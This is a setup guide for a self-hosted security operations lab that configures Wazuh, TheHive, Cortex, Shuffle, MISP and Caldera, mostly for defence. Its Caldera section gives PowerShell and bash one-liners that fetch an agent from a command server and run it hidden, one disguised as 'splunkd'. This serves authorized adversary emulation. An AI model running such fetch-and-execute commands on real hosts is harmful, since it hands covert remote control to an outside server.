# Configuration Guide

## Overview

This guide covers post-installation configuration for all SOC-in-a-Box components.

## Wazuh Configuration

### Agent Configuration (Windows)

Edit `C:\Program Files (x86)\ossec-agent\ossec.conf`:

```xml
<ossec_config>
  <client>
    <server>
      <address>WAZUH_MANAGER_IP</address>
      <port>1514</port>
      <protocol>tcp</protocol>
    </server>
  </client>

  <!-- Sysmon Integration -->
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <!-- Security Events -->
  <localfile>
    <location>Security</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <!-- PowerShell -->
  <localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>

  <!-- Windows Defender -->
  <localfile>
    <location>Microsoft-Windows-Windows Defender/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
</ossec_config>
```

### Custom Detection Rules

Copy rules to Wazuh Manager:

```bash
docker cp detection-rules/windows/custom_rules.xml \
  single-node-wazuh.manager-1:/var/ossec/etc/rules/

docker exec -it single-node-wazuh.manager-1 bash -c \
  "chown wazuh:wazuh /var/ossec/etc/rules/custom_rules.xml && \
   /var/ossec/bin/wazuh-control restart"
```

### Enable Sysmon Rules

Edit `/var/ossec/etc/ossec.conf` in Wazuh Manager:

```xml
<ruleset>
  <decoder_dir>ruleset/decoders</decoder_dir>
  <rule_dir>ruleset/rules</rule_dir>
  <rule_exclude>0215-policy_rules.xml</rule_exclude>
  <list>etc/lists/audit-keys</list>
  
  <!-- Custom Rules -->
  <rule_dir>etc/rules</rule_dir>
</ruleset>
```

---

## TheHive Configuration

### Initial Setup

1. Access http://localhost:9000
2. Login: `admin@thehive.local` / `secret`
3. Change default password

### Create Organization

1. Go to Admin → Organizations
2. Create "SOC" organization
3. Add users as needed

### Connect Cortex

1. Go to Admin → Platform Management → Cortex
2. Add server:
   - Name: `Cortex`
   - URL: `http://cortex:9001`
   - API Key: (from Cortex)

### Alert Templates

Create custom alert templates for Wazuh integration:

```json
{
  "type": "wazuh",
  "source": "Wazuh SIEM",
  "sourceRef": "{{rule.id}}-{{timestamp}}",
  "title": "{{rule.description}}",
  "description": "Agent: {{agent.name}}\nRule: {{rule.id}}\nLevel: {{rule.level}}",
  "severity": "{{#if (gt rule.level 12)}}3{{else if (gt rule.level 8)}}2{{else}}1{{/if}}",
  "tags": ["wazuh", "{{rule.groups}}"],
  "tlp": 2,
  "pap": 2
}
```

---

## Cortex Configuration

### Create Organization

1. Access http://localhost:9001
2. Login as superadmin
3. Create "SOC" organization

### Create TheHive User

1. Go to Organizations → SOC → Users
2. Create user:
   - Login: `thehive`
   - Full Name: `TheHive Integration`
   - Roles: `read`, `analyze`, `orgadmin`
3. Create API Key

### Enable Analyzers

Enable these free analyzers:

| Analyzer | API Key Required | Purpose |
|----------|------------------|---------|
| FileInfo | No | File analysis |
| Abuse_Finder | No | Abuse contacts |
| MaxMind_GeoIP | Yes (free) | IP geolocation |
| VirusTotal | Yes (free) | Malware analysis |
| AbuseIPDB | Yes (free) | IP reputation |
| OTXQuery | Yes (free) | AlienVault OTX |
| Yara | No | Pattern matching |

### API Key Registration

**VirusTotal:**
1. Go to https://www.virustotal.com
2. Create free account
3. Get API key from profile

**AbuseIPDB:**
1. Go to https://www.abuseipdb.com
2. Create free account
3. Get API key

**AlienVault OTX:**
1. Go to https://otx.alienvault.com
2. Create free account
3. Get API key

---

## Shuffle Configuration

### Initial Setup

1. Access http://localhost:3001
2. Login: `admin` / `shuffle123`
3. Complete setup wizard

### Activate Apps

1. Go to Apps
2. Search and activate:
   - TheHive
   - Cortex
   - Wazuh
   - VirusTotal
   - Email
   - HTTP

### Configure App Credentials

**TheHive:**
```
URL: http://thehive:9000
API Key: YOUR_THEHIVE_API_KEY
```

**Cortex:**
```
URL: http://cortex:9001
API Key: YOUR_CORTEX_API_KEY
```

**Wazuh:**
```
URL: https://wazuh-manager:55000
Username: wazuh-wui
Password: YOUR_PASSWORD
Verify SSL: false
```

### Create Webhook

1. Go to Workflows → Triggers
2. Create Webhook
3. Copy webhook URL for Wazuh integration

---

## MISP Configuration

### Initial Setup

1. Access https://localhost:8443
2. Login: `admin@admin.test` / `admin`
3. Change password immediately

### Enable Threat Feeds

1. Go to Sync Actions → List Feeds
2. Enable feeds:
   - CIRCL OSINT Feed
   - Botvrij.eu
   - abuse.ch MalwareBazaar
   - abuse.ch URLhaus

3. Click "Fetch and store all feed data"

### Create API Key

1. Go to Global Actions → My Profile
2. Generate Auth Key
3. Save for integrations

### Integration with TheHive

1. In MISP, generate API key
2. In TheHive, add MISP connector:
   - URL: `https://misp:443`
   - API Key: YOUR_MISP_KEY
   - Verify SSL: false

---

## Caldera Configuration

### Initial Setup

1. Access http://localhost:8888
2. Login: `red` / `admin`

### Agent Deployment

**Windows (PowerShell):**
```powershell
$server="http://CALDERA_IP:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
[io.file]::WriteAllBytes("C:\Users\Public\$name",$data);
Start-Process -FilePath "C:\Users\Public\$name" -ArgumentList "-server $server -group red" -WindowStyle Hidden;
```

**Linux (Bash):**
```bash
server="http://CALDERA_IP:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red &
```

### Create Adversary Profiles

1. Go to Adversaries
2. Create profile with desired techniques
3. Assign to operations

### Run Operations

1. Go to Operations
2. Create new operation
3. Select adversary and agents
4. Start operation

---

## Network Configuration

### Docker Network

All services use `soc-network`:

```bash
docker network create soc-network
```

### Firewall Rules (if needed)

```bash
# Allow Wazuh agent connections
ufw allow 1514/tcp
ufw allow 1515/tcp

# Allow web interfaces
ufw allow 443/tcp
ufw allow 9000/tcp
ufw allow 9001/tcp
ufw allow 3001/tcp
ufw allow 8443/tcp
ufw allow 8888/tcp
```

---

## SSL/TLS Configuration

### Generate Self-Signed Certificates

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt \
  -subj "/CN=soc-in-a-box/O=SOC/C=US"
```

### Configure for Production

For production deployment:
1. Obtain proper SSL certificates
2. Configure reverse proxy (nginx/traefik)
3. Enable HTTPS on all services
4. Disable HTTP access
